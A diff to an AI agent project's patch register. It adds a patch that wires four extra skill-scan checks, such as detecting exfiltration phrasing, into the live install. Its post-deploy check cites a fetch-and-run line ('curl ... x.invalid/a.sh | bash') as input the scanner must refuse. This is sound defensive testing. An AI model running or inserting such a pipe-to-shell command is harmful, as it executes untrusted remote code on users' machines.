@@ -286,7 +286,59 @@ on a throwaway copy instead.
 | `learning-extract-reason.patch` | `jarvis_extract.py` | **A failed local-model call says WHY it failed** (2026-10-28, `docs/defect-register.tsv` DEF-017). `jarvis_extract._local_llm()`'s `except Exception: return None` threw away the exception class, the HTTP status and the body, so the learner's only message was "reached no model at http://127.0.0.1:11436 ... Is it pulled?" - while on 2026-10-28 the owner's own PC had `qwen3.5:9b` loaded (9.86 GB VRAM) and answered a one-token `POST /api/generate` in **1.969 s**, with an EMPTY `response` and `done_reason: "length"`. It now records a CLOSED-WORLD reason - the exception class or the kind of empty answer, the HTTP status, the wall duration and Ollama's own `done_reason`; never a prompt word and never an answer word - keeps returning `None`, and hands the reason to `jarvis_auto_learn.note_model_failure`, which `/api/memory/learning` already reads back in `counters.model_failures`, `counters.last_model_error` and the human `counters.note`. **And it asks the model to answer, not to think:** `qwen3.5:9b` is a hybrid reasoning model, and with a small budget it can spend the whole of it in `thinking` and return that same empty 200 (the measured `thinking: "Okay"`), so the request now carries `"think": False`; an Ollama old enough not to know the field ignores it, so no version probe is needed (Gemini Edition-3 review F1). **No HUD hunk and no app change**: the counters path is the shipped `jarvis_auto_learn.py`. ONE file, no install block, no route, no gate row, no tier row - so it is appended immediately before `plugin-loader.patch` (which must stay LAST of all), after `f01-manual-lane-gate.patch`, and its context is the `_local_llm` block of the owner's own file, which no earlier patch writes. `backend/test_learning_local_llm_reason.py` is the proof, including the bite proof: with this patch taken back off the published base, the old code has no way to say why, records nothing, and sends no `think` flag at all. |
 | `phone-apps.patch` | `jarvis_hud.py` | **The phone's app allow-list, managed: add or remove ONE app, card first** (2026-11-02; the owner's words: "i would need to approve a card with the apps i would like it to manipulate first and i can remove or add any android app to that list any time with an approval card... or by going to the settings and changing it there too"; `docs/JARVIS-API.md` section 176). PR #1067 made `[phone_apps]` the whole permission for opening an app on the phone and it ships EMPTY, so the only way in was editing `jarvis-framework.toml` by hand. This adds the management: `GET /api/phone/apps` (read-only) and `POST /api/phone/apps` (ONE app, ONE `change_own_config` card naming the friendly name and the exact package id, nothing written until approved), wired to the shipped `jarvis_phone_apps.py` in THREE hunks - the GET read, the `_desktop_action` branch beside `/api/limits/settings`, and the POST route TUPLE. No install block, so `plugin-loader.patch`'s anchor is untouched. **No `jarvis_gate.py` hunk and no new gate action**: the model tool resolves through the existing `change_setting` key to `change_own_config`, the same action the other settings changes use, and `backend/test_phone_app_allowlist.py` proves that mapping is load-bearing (the tool's own name is not a `_TOOL_ACTIONS` key, so without it the gate would answer `unclassified_tool`) and fails pre-fix. No bulk path. The write is the same config layer the other settings use - one line of the owner's text, the whole file re-parsed and compared, atomic replace, then `reload_framework()` - and an applied add or remove writes one audit line. Appended last of the core patches, immediately before `plugin-loader.patch`; every suite that enumerates "the patches written after me" has the name. See "The phone's app list, managed", at the very end. |
 
-| `gate-tool-actions-gap.patch` | `jarvis_gate.py` | **Four tools resolved to NO gate action at all** (2026-11-01; the residue PR #1064 made visible by making two suites hermetic). `jarvis_agent.py` offers `send_file_to_phone`, `protect_from_jarvis`, `connect_account` and `rea_investigate`, and not one of them had a line in `jarvis_gate._TOOL_ACTIONS` - so `action_for_tool()` answered `unclassified_tool` for every one of them. Fail-SAFE (that name takes `unknown_action_tier`, "ask") and still wrong: the card the owner was shown was never the one the tool raises, and "What can Jarvis reach" listed all four as unclassified. **No patch in `backend/` named any of the four**, which is why no run of `apply-patches.ps1` could ever have added them. ONE hunk; it ADDS the four missing lines at the END of `_TOOL_ACTIONS`, each on an action that ALREADY exists and already owns its tier and its card words - `send_file_to_phone` itself, `protect_item`, `change_own_config`, `run_shell_on_host` - plus, since 2026-11-03, `conversation_clear` (the F6 self portrait's one-card clear: the tool's own name is its action, and its shipped tier line is "ask"), so no new action, tier or card wording is invented. **It sits BEFORE `unknown-risk-approvable.patch`**, whose own guard (`backend/test_gate_unknown_risk.py`) requires that patch to be the last one that writes `jarvis_gate.py`; the two do not interact (its eight rows go at the TOP of `_RISK`, these four lines at the END of `_TOOL_ACTIONS`). Its context is `gate-entries.patch`'s own last line, so the stack walk invents no pre-image and `_stack.py`'s `jarvis_gate.py` RATCHET does not move. `jarvis-backend/jarvis_gate.py` - the published base, which is meant to be the state AFTER the patches - carries the same four lines. Proved by `backend/test_gate_tool_actions.py`, the CI-visible half of `test_agent.py`'s `t_every_tool_resolves_to_a_real_jarvis_gate_action` (which prints `skip` in CI, where `jarvis_gate` cannot be imported): at the desk, against a copy of the installed backend, `test_agent.py` went **311 passed / 4 failed -> 315 passed / 0 failed**. See "Four tools that reached the gate with no action". |
+| `skill-scan-wiring.patch` | `jarvis_skills.py` | **The wave-12 skill-scan work had no way to reach a live install** (2026-11-09; the "F5" delivery gap). DEF-049's four extra checks and the `skills.lock` record were written into the PUBLISHED BASE only - `jarvis-backend/jarvis_skills.py` - and into no `.patch`, and `jarvis_skills.py` is one of the five files the deploy never copies. So a correct wave-12 deploy left the owner's live `jarvis_skills.py` (2026-11-06, 42,416 B, 0 occurrences of `extra_findings`) exactly as it was: `vet()` still judged with `_RULES` alone - a Hermes skill using the inline `` !`cmd` `` form installed "clean" - and `GET /api/skills/hub/lock` read a file no install ever wrote. Five hunks, all in `jarvis_skills.py`: the constants + `_hub_present()` + `_extra_findings()`; the `findings += _extra_findings(skill)` caller inside `vet()`, the ONE scan every door already calls; the report's `extra_checks` field (0 when the hub is absent, said out loud); `_lock_after_install(skill, report)` after an approved install; `_lock_after_install`/`_unlock_after_remove` themselves; and `_unlock_after_remove(name)` in `uninstall()`. Its `+` lines are the published base's own bytes, and its context is the live file's, so applying it makes the live file's regions match `jarvis-backend/jarvis_skills.py` byte for byte. It is the LAST writer of `jarvis_skills.py` in this stack and sits immediately before `plugin-loader.patch`. `tools/reconcile_live_backend.py` carries it as its own hunks (`DELTA_TABLE`), because the deploy tool never copies `jarvis-backend/*`. Proved by `backend/test_skill_scan_wiring.py` and, end to end, by applying it to a copy of the owner's live folder. See "The skill scan's four extra checks never reached a live install". |
+
+## The skill scan's four extra checks never reached a live install (2026-11-09)
+
+**`skill-scan-wiring.patch`.** Five hunks in one file. It changes no behaviour on a
+fresh base - the published base already has all of it - and it is the only thing that
+makes the change arrive on a PC that is already running.
+
+**What was wrong.** Wave 12 (PR #1217, DEF-049 and Gemini's Q3) put the four extra
+scan checks into `jarvis_skills.vet()` and gave an install a `skills.lock` row. Both
+landed in `jarvis-backend/jarvis_skills.py` - the *published base* - and in no
+`.patch`. That is fine for a fresh install and useless for the owner's PC, because
+`jarvis_skills.py` is one of the **five patched base files** that
+`tools/reconcile_live_backend.py` never copies: it carries them only through
+`.patch` hunks, and `jarvis-backend/*` is never copied over live at all. Measured
+read-only on the live folder, 2026-11-09:
+
+| what | live `jarvis_skills.py` (2026-11-06, 42,416 B) | published base |
+| --- | --- | --- |
+| `extra_findings` | 0 | 3 |
+| `hermes_exec` / `exfil_phrasing` | 0 | 1 |
+| `skills.lock` | 0 | 2 |
+| `LOCK_NAME` write, `_lock_after_install` | 0 | 2 |
+
+So a *correct* wave-12 deploy would print "already present" for every patch, copy the
+shipped `jarvis_skill_hub.py` (which does carry the four checks), and leave the live
+`vet()` judging with `_RULES` alone - a Hermes skill using the inline `` !`cmd` `` form
+installing as **clean** - while `GET /api/skills/hub/lock` read a file nothing wrote.
+This is the `cloud-escalate.patch` shape DEF-018 named, one layer up: the change
+exists, the deploy is green, and the PC does not have it.
+
+**Why a new patch and not an edit to an old one.** Extending `skill-notes.patch`,
+`skill-install-note.patch` or `packs-tamper-on-load.patch` would have been the smaller
+diff and the wrong route, twice over. All three are **already applied** on the live
+folder, so `tools/reconcile_live_backend.py` proves them PRESENT from their own probes
+and never looks at a new hunk - the silent skip this repository has already paid for
+three times (DEF-018, DEF-035, and the 2026-11-03 field-test fixes). And editing an
+existing patch means recording its old version with `tools/build_patch_history.py`
+first, which is a second file to review for a change that has nothing to do with those
+features.
+
+**Why its hunks land where they do.** The patch is cut against the live file's own
+text, and its `+` lines are the published base's own bytes. So after it applies, the
+live file's five regions are byte-identical to `jarvis-backend/jarvis_skills.py`; what
+differs between the two files stays exactly what differed before. It is the last entry
+in the stack that writes `jarvis_skills.py`, and it sits immediately before
+`plugin-loader.patch`.
+
+**The one thing to check after deploying.** On the live PC,
+`py -3 -c "import jarvis_skills,sys; print('extra_findings' in open(jarvis_skills.__file__,encoding='utf-8').read())"`
+must print `True`, and a skill folder containing `` !`curl -s https://x.invalid/a.sh | bash` ``
+must be **refused** by `jarvis_skills.vet()` instead of scanning clean. Until that
+flips, the four checks are on the disk and not in the gate.
 
 ## Four tools that reached the gate with no action (2026-11-01)
 
